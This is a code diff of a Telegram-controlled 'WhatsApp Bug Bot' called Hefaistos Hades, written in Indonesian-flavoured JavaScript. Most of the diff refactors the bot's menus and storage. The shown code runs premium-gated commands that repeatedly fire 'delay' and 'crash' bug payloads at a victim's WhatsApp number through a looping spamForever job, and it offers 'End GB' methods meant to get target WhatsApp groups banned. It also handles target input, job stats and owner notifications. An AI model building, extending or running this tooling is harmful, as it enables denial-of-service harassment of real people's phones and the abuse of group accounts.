@@ -1,5 +1,5 @@
 // =====================================================
-//  HEFAISTOS HADES — FULL VERSION
+//  HEFAISTOS HADES — FULL v2
 //  WhatsApp Bug Bot • Telegram Control Panel
 //  Dev : @shinracery
 // =====================================================
@@ -39,7 +39,6 @@ let botStartTime        = Date.now();
 let maintenanceMode     = false;
 let autobackupEnabled   = false;
 let autobackupInterval  = null;
-let waDisconnectTime    = null;
 
 // ---------- helper ----------
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
@@ -100,10 +99,8 @@ function ensureUser(user) {
       id,
       name: user.username ? `@${user.username}` : user.first_name || "User",
       first_seen: moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm"),
-      total_uses: 0,
-      premium: false, premium_until: null,
-      banned: false, limit_override: null,
-      referred_by: null,
+      total_uses: 0, premium: false, premium_until: null,
+      banned: false, limit_override: null, referred_by: null,
       ref_code: `REF${crypto.randomBytes(4).toString("hex").toUpperCase()}`,
     };
     writeJSON(USERS_FILE, db);
@@ -185,8 +182,7 @@ function isPremiumUser(userId) {
 function sisaHariPremium(userId) {
   const u = loadPremUsers();
   if (!u[userId]) return 0;
-  const exp = moment(u[userId], "DD-MM-YYYY");
-  const diff = exp.diff(moment(), "days");
+  const diff = moment(u[userId], "DD-MM-YYYY").diff(moment(), "days");
   return diff >= 0 ? diff : 0;
 }
 function getPremExpired(userId) { return loadPremUsers()[userId] || "-"; }
@@ -263,8 +259,7 @@ function delWhitelist(nomor) {
 }
 function isWhitelisted(nomor) {
   const w = loadWhitelist();
-  const n = nomor.replace(/[^0-9]/g, "");
-  return w.list.includes(n);
+  return w.list.includes(nomor.replace(/[^0-9]/g, ""));
 }
 
 // ---------- COIN ----------
@@ -373,6 +368,11 @@ const getTop = (n = 10) => Object.values(loadPoints()).sort((a, b) => b.points -
 const addSuitWin  = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 2; d[String(u.id)].win += 1; savePoints(d); };
 const addSuitLose = (u) => { const d = ensurePoint(u); d[String(u.id)].lose += 1; savePoints(d); };
 const addSuitDraw = (u) => { const d = ensurePoint(u); d[String(u.id)].draw += 1; savePoints(d); };
+function givePointDaily(user) {
+  const d = ensurePoint(user);
+  d[String(user.id)].points += 5;
+  savePoints(d);
+}
 
 // =====================================================
 // ============ STATS STORAGE ==========================
@@ -686,7 +686,7 @@ async function catchingOs(target) {
 }
 
 // =====================================================
-// ================ BAN GROUP FUNCTIONS ================
+// ================ BAN GROUP ==========================
 // =====================================================
 async function groupBan2(sock, target) {
   target = String(target);
@@ -762,14 +762,14 @@ async function spamForever(ctx, label, target, tasks) {
   const groupId = ctx.chat?.type !== "private" ? ctx.chat.id : null;
 
   activeSpam.set(jobId, { userId, userName, label, target, stop: false, stats: { ok: 0, fail: 0 }, startAt: Date.now(), iterasi: 0 });
-  try { logStatsStart(userId, userName, label, target, groupId); } catch (e) { console.log("stats err:", e.message); }
+  try { logStatsStart(userId, userName, label, target, groupId); } catch {}
   addLog("BUG_START", `${userName} → ${label} → ${target.split("@")[0]}`, userId);
 
   const startAt = Date.now();
   let iterasi = 0;
 
   await ctx.telegram.sendMessage(ctx.chat.id,
-    `🚀 <b>${label}</b> start ke <code>${target.split("@")[0]}</code>\n🆔 Job: <code>${jobId}</code>\n\nKetik /stopbug buat berhentiin semua spam kamu.`,
+    `🚀 <b>${label}</b> start ke <code>${target.split("@")[0]}</code>\n🆔 Job: <code>${jobId}</code>\n\nKetik /stopbug buat berhentiin.`,
     { parse_mode: "HTML" }
   ).catch(() => {});
 
@@ -782,25 +782,20 @@ async function spamForever(ctx, label, target, tasks) {
         { parse_mode: "HTML" }
       ).catch(() => {});
       try { logStatsFinish(userId, state?.stats.ok || 0, state?.stats.fail || 0); } catch {}
-
       bot.telegram.sendMessage(ownerID,
-        `✅ <b>JOB SELESAI</b>\n\n👤 User : ${userName}\n🆔 Job : <code>${jobId}</code>\n🎯 Target : <code>${target.split("@")[0]}</code>\n⚙️ Metode : ${label}\n\n✅ Sukses : ${state?.stats.ok || 0}\n❌ Gagal : ${state?.stats.fail || 0}\n⏱ Durasi : ${durasi}s`,
+        `✅ <b>JOB SELESAI</b>\n\n👤 ${userName}\n🆔 ${jobId}\n🎯 ${target.split("@")[0]}\n⚙️ ${label}\n\n✅ ${state?.stats.ok || 0} | ❌ ${state?.stats.fail || 0} | ⏱ ${durasi}s`,
         { parse_mode: "HTML" }
       ).catch(() => {});
-      addLog("BUG_FINISH", `${userName} → ${label} → OK:${state?.stats.ok || 0} FAIL:${state?.stats.fail || 0}`, userId);
-
       activeSpam.delete(jobId);
       return;
     }
-
     iterasi++;
     state.iterasi = iterasi;
     let semuaOk = true;
     for (const t of tasks) {
-      try { await t.fn(); } catch (e) { semuaOk = false; console.log(`[${label}|${jobId}] ${t.name} err:`, e.message); }
+      try { await t.fn(); } catch (e) { semuaOk = false; }
     }
     if (semuaOk) state.stats.ok++; else state.stats.fail++;
-
     if (iterasi % 10 === 0) {
       const durasi = Math.floor((Date.now() - startAt) / 1000);
       await ctx.telegram.sendMessage(ctx.chat.id,
@@ -812,6 +807,7 @@ async function spamForever(ctx, label, target, tasks) {
   }
 }
 
+// [PART 2 nyusul...]
 // =====================================================
 // ============ IN MEMORY / QUEUE ======================
 // =====================================================
@@ -843,9 +839,7 @@ class TaskQueue {
 }
 const queue = new TaskQueue();
 
-// =====================================================
-// ============ COOLDOWN ===============================
-// =====================================================
+// ---------- COOLDOWN ----------
 const cooldownFile = "./database/cooldown.json";
 const loadCooldown = () => { try { return JSON.parse(fs.readFileSync(cooldownFile)).cooldown || 5; } catch { return 5; } };
 const saveCooldown = (s) => fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: s }, null, 2));
@@ -891,7 +885,6 @@ async function startSesi() {
         bot.telegram.editMessageCaption(lastPairingMessage.chatId, lastPairingMessage.messageId, undefined, txt, { parse_mode: "HTML" }).catch(() => {});
       }
       isWhatsAppConnected = true;
-      waDisconnectTime = null;
       console.log(chalk.bold.yellow(`
   ⬡═—⊱ SENDER ONLINE ⊰—═⬡
   ┃ Sukses Terhubung, Terima Kasih
@@ -900,9 +893,7 @@ async function startSesi() {
     }
     if (connection === "close") {
       const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-      console.log(chalk.red("WA terputus:"), reconnect ? "Coba nyambung lagi..." : "Perlu pairing ulang.");
       if (isWhatsAppConnected) {
-        waDisconnectTime = Date.now();
         bot.telegram.sendMessage(ownerID, `⚠️ <b>SENDER DOWN</b>\n\nWA disconnect. Mencoba reconnect...`, { parse_mode: "HTML" }).catch(() => {});
       }
       if (reconnect) startSesi();
@@ -924,7 +915,7 @@ const checkCooldown = (ctx, next) => {
   const now = Date.now();
   if (userCooldowns.has(id)) {
     const diff = (now - userCooldowns.get(id)) / 500;
-    if (diff < cooldown) return ctx.reply(`⏳ ☇ Sabar dulu ${Math.ceil(cooldown - diff)} detik ya.`);
+    if (diff < cooldown) return ctx.reply(`⏳ Sabar dulu ${Math.ceil(cooldown - diff)} detik ya.`);
   }
   userCooldowns.set(id, now);
   next();
@@ -933,26 +924,20 @@ const premGroupOnly = () => async (ctx, next) => {
   if (ctx.chat?.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
   if (!isPremGroup(ctx.chat.id)) {
     const t = esc(ctx.chat?.title || "Grup ini");
-    return ctx.reply(`❌ ☇ <b>${t}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, { parse_mode: "HTML" });
+    return ctx.reply(`❌ <b>${t}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, { parse_mode: "HTML" });
   }
   next();
 };
-// Middleware cek banned & maintenance
+
+// middleware maintenance & banned
 bot.use(async (ctx, next) => {
   if (!ctx.from) return next();
   if (String(ctx.from.id) === String(ownerID)) return next();
+  if (maintenanceMode) return ctx.reply("🔧 Bot sedang maintenance.").catch(() => {});
+  if (isBanned(ctx.from.id)) return ctx.reply("🚫 Kamu dibanned dari bot ini.").catch(() => {});
 
-  if (maintenanceMode) {
-    return ctx.reply("🔧 Bot sedang maintenance. Coba lagi nanti.").catch(() => {});
-  }
-  if (isBanned(ctx.from.id)) {
-    return ctx.reply("🚫 Kamu dibanned dari bot ini.").catch(() => {});
-  }
-
-  // pastikan user terdaftar
   ensureUser(ctx.from);
 
-  // auto referral kalau ada command /start di-deep-link
   const text = ctx.message?.text || "";
   if (text.startsWith("/start ")) {
     const code = text.split(" ")[1];
@@ -961,8 +946,6 @@ bot.use(async (ctx, next) => {
       if (ok) ctx.reply("✅ Kode referral berhasil dipakai!").catch(() => {});
     }
   }
-
-  // log per command
   if (text.startsWith("/")) {
     const c = normCmd(text.split(" ")[0].split("@")[0]);
     if (c) logCmd(c);
@@ -974,338 +957,61 @@ bot.use(async (ctx, next) => {
 // ============ KEYBOARDS ==============================
 // =====================================================
 const START_KEYBOARD = [[
-  { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/setting_menu", style: "success", icon_custom_emoji_id: "6163328887813051603" },
+  { text: "Open Menu", callback_data: "/setting_menu", style: "success" },
 ]];
 
 const SETTING_KEYBOARD = [
   [
-    { text: "𝐁𝐚𝐜𝐤", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5463167176099780578" },
-    { text: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "/bug_menu", style: "success", icon_custom_emoji_id: "5267231489610760977" },
+    { text: "Back", callback_data: "/start", style: "danger" },
+    { text: "Bug Menu", callback_data: "/bug_menu", style: "success" },
   ],
   [
-    { text: "🆕 New Poll Bug", callback_data: "/bug_poll_menu", style: "primary", icon_custom_emoji_id: "5267231489610760977" },
-    { text: "𝐁𝐚𝐧 𝐆𝐫𝐨𝐮𝐩", callback_data: "/ban_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
+    { text: "Bug Poll", callback_data: "/bug_poll_menu", style: "primary" },
+    { text: "Ban Group", callback_data: "/ban_menu", style: "danger" },
   ],
   [
-    { text: "🆕 𝐆𝐫𝐮𝐩", callback_data: "/group_menu", style: "success", icon_custom_emoji_id: "6163328887813051603" },
+    { text: "Grup",   callback_data: "/group_menu",  style: "success" },
+    { text: "Member", callback_data: "/member_menu", style: "primary" },
+  ],
+  [
+    { text: "Admin", callback_data: "/admin_menu", style: "danger" },
   ],
 ];
 
 const BUG_KEYBOARD = [
   [
-    { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
-    { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/start", style: "primary", icon_custom_emoji_id: "6163328887813051603" },
+    { text: "Back", callback_data: "/setting_menu", style: "danger" },
+    { text: "Home", callback_data: "/start", style: "primary" },
   ],
 ];
 
-// Ban keyboard: New Poll + Back + Home
 const BAN_KEYBOARD = [
   [
-    { text: "🆕 New Poll", callback_data: "/ban_poll_menu", style: "success", icon_custom_emoji_id: "6163328887813051603" },
+    { text: "Ban Poll", callback_data: "/ban_poll_menu", style: "success" },
   ],
   [
-    { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
-    { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/start", style: "primary", icon_custom_emoji_id: "6163328887813051603" },
+    { text: "Back", callback_data: "/setting_menu", style: "danger" },
+    { text: "Home", callback_data: "/start", style: "primary" },
   ],
 ];
 
-// =================== POLL STORE ===================
+// =====================================================
+// ============ POLL STORE =============================
+// =====================================================
 const activeBanPolls   = new Map();
 const userLastBanPoll  = new Map();
 const activeBugPolls   = new Map();
 const userLastBugPoll  = new Map();
-const activeGroupPolls = new Map();
-const userLastGroupPoll = new Map();
 
-// =================== PENDING STATE ===================
+// =====================================================
+// ============ PENDING STATE ==========================
+// =====================================================
 const pendingBugUser    = new Map();
 const pendingBanUser    = new Map();
-const pendingGroupUser  = new Map();
+const pendingGroupAsk   = new Map();
 
 // =====================================================
-// ============ RICH HTML ==============================
-// =====================================================
-function buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus) {
-  return `
-<h1>⚔️ Hefaistos Hades</h1>
-<p><i>System Control • WhatsApp Bug Bot</i></p>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<p>Halo <b>${esc(userFirst)}</b> 👋 selamat datang kembali.</p>
-<h2>📊 Status System</h2>
-<table>
-  <tr><th>Komponen</th><th>Status</th></tr>
-  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
-  <tr><td>Runtime</td><td><code>${runtimeStatus}</code></td></tr>
-  <tr><td>Memory</td><td><code>${memoryStatus}</code></td></tr>
-  <tr><td>Akses Kamu</td><td><b>${premiumStatus}</b></td></tr>
-</table>
-<hr/>
-<h2>✨ Fitur Utama</h2>
-<checklist>
-  <li checked>Bug Delay &amp; Crash</li>
-  <li checked>Pairing WhatsApp</li>
-  <li checked>Premium Group System</li>
-  <li checked>Auto Update Script</li>
-  <li checked>Game Tic Tac Toe &amp; Suit</li>
-</checklist>
-<hr/>
-<details>
-  <summary>📌 Info Developer</summary>
-  <p>Dev : <b>@shinracery</b></p>
-  <p>Versi : <b>2.0.0-Hades</b></p>
-  <p>Bahasa : <b>JavaScript</b></p>
-</details>
-<p>Tekan tombol <b>Open Menu</b> di bawah buat mulai.</p>
-`.trim();
-}
-
-// =====================================================
-// ============ /start =================================
-// =====================================================
-bot.start(async (ctx) => {
-  const userId        = ctx.from.id;
-  const senderStatus  = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
-  const runtimeStatus = formatRuntime();
-  const memoryStatus  = formatMemory();
-  const premiumStatus = isPremiumUser(userId) ? "Premium" : "Free";
-  const userFirst     = ctx.from.first_name || ctx.from.username || "Kak";
-  const html = buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus);
-
-  try {
-    await ctx.telegram.callApi("sendRichMessage", {
-      chat_id: ctx.chat.id, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
-    });
-  } catch (err) {
-    console.log("rich gagal:", err?.response?.description || err.message);
-    const fallback = `
-<blockquote>•.¸ Hefaistos Hades ¸.•</blockquote>
-↯ Dev : @shinracery
-↯ Sender : ${senderStatus}
-↯ Runtime : ${runtimeStatus}
-`.trim();
-    await ctx.replyWithPhoto(thumbnailUrl, { caption: fallback, parse_mode: "HTML", reply_markup: { inline_keyboard: START_KEYBOARD } });
-  }
-});
-
-// =====================================================
-// ============ MENU CALLBACK ==========================
-// =====================================================
-bot.action("/start", async (ctx) => {
-  await ctx.answerCbQuery();
-  const userId = ctx.from.id;
-  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
-  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
-  const html = buildStartHtml(userFirst, senderStatus, formatRuntime(), formatMemory(), isPremiumUser(userId) ? "Premium" : "Free");
-  const msgId = ctx.callbackQuery.message.message_id;
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
-    });
-  } catch (e) { console.log("edit start err:", e?.response?.description || e.message); }
-});
-
-bot.action("/setting_menu", async (ctx) => {
-  await ctx.answerCbQuery();
-  const msgId = ctx.callbackQuery.message.message_id;
-  const html = `
-<h2>☰ SYSTEM CONTROL PANEL</h2>
-<p><i>(Page 2/4) • 𝙷𝙴𝙵𝙰𝙸𝚂𝚃𝙾𝚂 𝙷𝙰𝙳𝙴𝚂</i></p>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<h3>☰ Connect Bot / Update</h3>
-<ul>
-  <li>/addpairing  → Add Sender</li>
-  <li>/killsession → Delete Sender</li>
-  <li>/update      → Auto Update</li>
-</ul>
-<h3>☰ Owners Settings</h3>
-<ul>
-  <li>/addpremgrup  → Add Grup Premium</li>
-  <li>/delpremgrup  → Hapus Grup Premium</li>
-  <li>/listpremgrup → List Grup Premium</li>
-</ul>
-<h3>☰ Menu Lain</h3>
-<ul>
-  <li>Bug Menu (list command)</li>
-  <li>Ban Group (poll)</li>
-  <li>Grup Menu (poll)</li>
-</ul>
-<h3>☰ Statistik &amp; Info</h3>
-<ul>
-  <li>/stats /info /history /topbug</li>
-  <li>/uptime /sysinfo /statscmd /statstarget</li>
-  <li>/topuser /topgrup</li>
-</ul>
-<h3>☰ Member</h3>
-<ul>
-  <li>/mypremium /myjob /limit /daily</li>
-  <li>/redeem /myreferral /help /ping</li>
-  <li>/saran /report</li>
-</ul>
-<hr/>
-<p>Security : <b>ACTIVE</b> | Network : <b>Hades Core</b></p>
-`.trim();
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: SETTING_KEYBOARD },
-    });
-  } catch (e) { console.log("setting err:", e?.response?.description || e.message); }
-});
-
-bot.action("/bug_menu", async (ctx) => {
-  await ctx.answerCbQuery();
-  const msgId = ctx.callbackQuery.message.message_id;
-  const html = `
-<h2>🐛 BUG MENU</h2>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<h3>Delay Bug</h3>
-<ul>
-  <li>/delayhard • Delay Hard</li>
-  <li>/ghost • Delay Ghost</li>
-  <li>/forceclose • Force Close</li>
-  <li>/forcezz • Force Zezz</li>
-  <li>/xdios • Delay Xdios</li>
-</ul>
-<h3>Crash Bug</h3>
-<ul>
-  <li>/bug • Pilih bug dari tombol</li>
-</ul>
-<p><i>Ketik /stopbug buat stop spam.</i></p>
-`.trim();
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BUG_KEYBOARD },
-    });
-  } catch (e) {}
-});
-
-bot.action("/ban_menu", async (ctx) => {
-  await ctx.answerCbQuery();
-  const msgId = ctx.callbackQuery.message.message_id;
-  const html = `
-<h2>🔥 BAN GROUP MENU</h2>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<h3>Metode</h3>
-<ul>
-  <li>End GB v1 (End Gb V1)</li>
-  <li>End GB v2 (End Gb V2)</li>
-</ul>
-<p><i>Klik <b>🆕 New Poll</b> di bawah.</i></p>
-`.trim();
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BAN_KEYBOARD },
-    });
-  } catch (e) {}
-});
-
-// =====================================================
-// ============ BUG POLL MENU ==========================
-// =====================================================
-bot.action("/bug_poll_menu", async (ctx) => {
-  const userId = ctx.from.id;
-  const chatId = ctx.chat.id;
-  await ctx.answerCbQuery("🆕 Buka poll bug");
-
-  const oldId = userLastBugPoll.get(userId);
-  if (oldId) {
-    const old = activeBugPolls.get(oldId);
-    if (old) { bot.telegram.deleteMessage(old.chatId, old.msgId).catch(() => {}); activeBugPolls.delete(oldId); }
-    userLastBugPoll.delete(userId);
-  }
-
-  await ctx.replyWithPhoto(thumbnailUrl, {
-    caption: `🐛 <b>BUG POLL</b>\n<i>Pilih jenis bug lewat vote di bawah ⬇️</i>\n\nSetelah milih, langsung kirim nomornya.`,
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: [[{ text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }]] },
-  }).catch(() => {});
-
-  const pollMsg = await ctx.telegram.sendPoll(chatId, "🐛 Mau pakai bug yang mana?",
-    ["Forceclose", "Delayhard", "Ghost", "Forcezz", "Xdios"],
-    { is_anonymous: false, allows_multiple_answers: false, open_period: 300 }
-  ).catch((e) => { console.log("bug poll err:", e.message); return null; });
-
-  if (!pollMsg || !pollMsg.poll) return;
-  activeBugPolls.set(pollMsg.poll.id, { chatId, msgId: pollMsg.message_id, userId });
-  userLastBugPoll.set(userId, pollMsg.poll.id);
-});
-
-// =====================================================
-// ============ BAN POLL MENU ==========================
-// =====================================================
-bot.action("/ban_poll_menu", async (ctx) => {
-  const userId = ctx.from.id;
-  const chatId = ctx.chat.id;
-  await ctx.answerCbQuery("🆕 Buka poll ban");
-
-  const oldId = userLastBanPoll.get(userId);
-  if (oldId) {
-    const old = activeBanPolls.get(oldId);
-    if (old) { bot.telegram.deleteMessage(old.chatId, old.msgId).catch(() => {}); activeBanPolls.delete(oldId); }
-    userLastBanPoll.delete(userId);
-  }
-
-  await ctx.replyWithPhoto(thumbnailUrl, {
-    caption: `💢 <b>BAN POLL</b>\n<i>Pilih metode ban lewat vote di bawah ⬇️</i>\n\nSetelah milih, langsung kirim link grupnya.`,
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: [[{ text: "𝐁𝐚𝐜𝐤", callback_data: "/ban_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }]] },
-  }).catch(() => {});
-
-  const pollMsg = await ctx.telegram.sendPoll(chatId, "🌸 Mau pakai metode ban yang mana?",
-    ["End GB v1 (End Gb V1)", "End GB v2 (End Gb V2)"],
-    { is_anonymous: false, allows_multiple_answers: false, open_period: 300 }
-  ).catch((e) => { console.log("ban poll err:", e.message); return null; });
-
-  if (!pollMsg || !pollMsg.poll) return;
-  activeBanPolls.set(pollMsg.poll.id, { chatId, msgId: pollMsg.message_id, userId });
-  userLastBanPoll.set(userId, pollMsg.poll.id);
-});
-
-// =====================================================
-// ============ GRUP POLL MENU =========================
-// =====================================================
-const GROUP_ACTIONS = [
-  { key: "info",   label: "ℹ️ Info Grup" },
-  { key: "admin",  label: "👑 List Admin" },
-  { key: "member", label: "👥 List Member" },
-  { key: "lock",   label: "🔒 Lock Grup" },
-  { key: "unlock", label: "🔓 Unlock Grup" },
-  { key: "invite", label: "🔗 Get Invite Link" },
-];
-
-bot.action("/group_menu", async (ctx) => {
-  const userId = ctx.from.id;
-  const chatId = ctx.chat.id;
-  await ctx.answerCbQuery("🆕 Buka menu grup");
-
-  const oldId = userLastGroupPoll.get(userId);
-  if (oldId) {
-    const old = activeGroupPolls.get(oldId);
-    if (old) { bot.telegram.deleteMessage(old.chatId, old.msgId).catch(() => {}); activeGroupPolls.delete(oldId); }
-    userLastGroupPoll.delete(userId);
-  }
-
-  await ctx.replyWithPhoto(thumbnailUrl, {
-    caption: `👥 <b>GROUP MENU</b>\n<i>Pilih aksi lewat vote di bawah ⬇️</i>\n\nSetelah vote, kirim <b>link grup WA</b> atau <b>ID grup</b>.`,
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: [[{ text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }]] },
-  }).catch(() => {});
-
-  const pollMsg = await ctx.telegram.sendPoll(chatId, "👥 Mau ngapain di grup?",
-    GROUP_ACTIONS.map((a) => a.label),
-    { is_anonymous: false, allows_multiple_answers: false, open_period: 300 }
-  ).catch((e) => { console.log("group poll err:", e.message); return null; });
-
-  if (!pollMsg || !pollMsg.poll) return;
-  activeGroupPolls.set(pollMsg.poll.id, { chatId, msgId: pollMsg.message_id, userId });
-  userLastGroupPoll.set(userId, pollMsg.poll.id);
-});
-
-// =====================================================
-// ============ HELPER GRUP ============================
+// ============ HELPERS GRUP ===========================
 // =====================================================
 async function resolveWaGroup(input) {
   if (!input) return null;
@@ -1332,56 +1038,217 @@ function groupInfoHtml(meta) {
   <tr><td>ID Grup</td><td><code>${meta.id}</code></td></tr>
   <tr><td>Total Member</td><td><b>${meta.participants.length}</b></td></tr>
   <tr><td>Total Admin</td><td><b>${admins.length}</b></td></tr>
-  <tr><td>Status</td><td><b>${meta.announce ? "🔒 Locked" : "🔓 Open"}</b></td></tr>
+  <tr><td>Status</td><td><b>${meta.announce ? "Locked" : "Open"}</b></td></tr>
   <tr><td>Dibuat</td><td><code>${creation}</code></td></tr>
   <tr><td>Owner</td><td><code>${meta.owner ? meta.owner.split("@")[0] : "-"}</code></td></tr>
 </table>
-<hr/>
-<p><i>Update: ${moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss")} WIB</i></p>
 `.trim();
 }
 function adminListHtml(meta) {
   const admins = meta.participants.filter((p) => p.admin);
-  const rows = admins.length
-    ? admins.map((a, i) => `<tr><td>${i + 1}. <code>${a.id.split("@")[0]}</code></td><td>${a.admin === "superadmin" ? "👑 Owner" : "🛡 Admin"}</td></tr>`).join("")
-    : `<tr><td colspan="2"><i>Gak ada admin</i></td></tr>`;
+  const rows = admins.length ? admins.map((a, i) => `<tr><td>${i + 1}. <code>${a.id.split("@")[0]}</code></td><td>${a.admin === "superadmin" ? "Owner" : "Admin"}</td></tr>`).join("") : `<tr><td colspan="2"><i>Gak ada admin</i></td></tr>`;
   return `<h1>👑 List Admin</h1>\n<p><i>${esc(meta.subject)}</i></p>\n<hr/>\n<table>\n<tr><th>Nomor</th><th>Jabatan</th></tr>\n${rows}\n</table>`.trim();
 }
 function memberListHtml(meta) {
   const members = meta.participants.slice(0, 30);
-  const rows = members.length
-    ? members.map((m, i) => `<tr><td>${i + 1}. <code>${m.id.split("@")[0]}</code></td><td>${m.admin ? "🛡 Admin" : "👤 Member"}</td></tr>`).join("")
-    : `<tr><td colspan="2"><i>Belum ada member</i></td></tr>`;
-  const more = meta.participants.length > 30 ? `<p><i>...dan ${meta.participants.length - 30} member lainnya</i></p>` : "";
-  return `<h1>👥 List Member</h1>\n<p><i>${esc(meta.subject)} (${meta.participants.length} member)</i></p>\n<hr/>\n<table>\n<tr><th>Nomor</th><th>Status</th></tr>\n${rows}\n</table>\n${more}`.trim();
+  const rows = members.length ? members.map((m, i) => `<tr><td>${i + 1}. <code>${m.id.split("@")[0]}</code></td><td>${m.admin ? "Admin" : "Member"}</td></tr>`).join("") : `<tr><td colspan="2"><i>Belum ada</i></td></tr>`;
+  const more = meta.participants.length > 30 ? `<p><i>...dan ${meta.participants.length - 30} lainnya</i></p>` : "";
+  return `<h1>👥 List Member</h1>\n<p><i>${esc(meta.subject)} (${meta.participants.length})</i></p>\n<hr/>\n<table>\n<tr><th>Nomor</th><th>Status</th></tr>\n${rows}\n</table>\n${more}`.trim();
 }
 
 // =====================================================
-// ============ POLL ANSWER ROUTER =====================
+// ============ /start =================================
+// =====================================================
+bot.start(async (ctx) => {
+  const userId = ctx.from.id;
+  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
+  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
+  const premiumStatus = isPremiumUser(userId) ? "Premium" : "Free";
+  const html = `
+<h1>⚔️ Hefaistos Hades</h1>
+<p><i>System Control • WhatsApp Bug Bot v2</i></p>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<p>Halo <b>${esc(userFirst)}</b> 👋</p>
+<h2>📊 Status System</h2>
+<table>
+  <tr><th>Komponen</th><th>Status</th></tr>
+  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
+  <tr><td>Runtime</td><td><code>${formatRuntime()}</code></td></tr>
+  <tr><td>Memory</td><td><code>${formatMemory()}</code></td></tr>
+  <tr><td>Akses Kamu</td><td><b>${premiumStatus}</b></td></tr>
+</table>
+<hr/>
+<p>Tekan tombol <b>Open Menu</b> buat mulai.</p>
+`.trim();
+  try {
+    await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD } });
+  } catch {
+    await ctx.replyWithPhoto(thumbnailUrl, {
+      caption: `⚔️ HEFAISTOS HADES\nSender: ${senderStatus}\nRuntime: ${formatRuntime()}`,
+      reply_markup: { inline_keyboard: START_KEYBOARD },
+    });
+  }
+});
+
+bot.action("/start", async (ctx) => {
+  await ctx.answerCbQuery();
+  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
+  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
+  const html = `
+<h1>⚔️ Hefaistos Hades</h1>
+<hr/>
+<p>Halo <b>${esc(userFirst)}</b> 👋</p>
+<table>
+  <tr><th>Status</th><th>Nilai</th></tr>
+  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
+  <tr><td>Runtime</td><td><code>${formatRuntime()}</code></td></tr>
+  <tr><td>Akses</td><td><b>${isPremiumUser(ctx.from.id) ? "Premium" : "Free"}</b></td></tr>
+</table>
+`.trim();
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: ctx.callbackQuery.message.message_id,
+      rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
+    });
+  } catch (e) {}
+});
+
+bot.action("/setting_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
+  const html = `
+<h2>☰ SYSTEM CONTROL PANEL</h2>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<h3>Menu Utama</h3>
+<ul>
+  <li>Bug Menu — list command</li>
+  <li>Bug Poll — pilih bug via poll</li>
+  <li>Ban Group — ban via poll</li>
+</ul>
+<h3>Grup / Member / Admin</h3>
+<ul>
+  <li>Grup — aksi grup WA</li>
+  <li>Member — fitur member</li>
+  <li>Admin — fitur admin</li>
+</ul>
+`.trim();
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
+      reply_markup: { inline_keyboard: SETTING_KEYBOARD },
+    });
+  } catch (e) {}
+});
+
+bot.action("/bug_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
+  const html = `
+<h2>🐛 BUG MENU</h2>
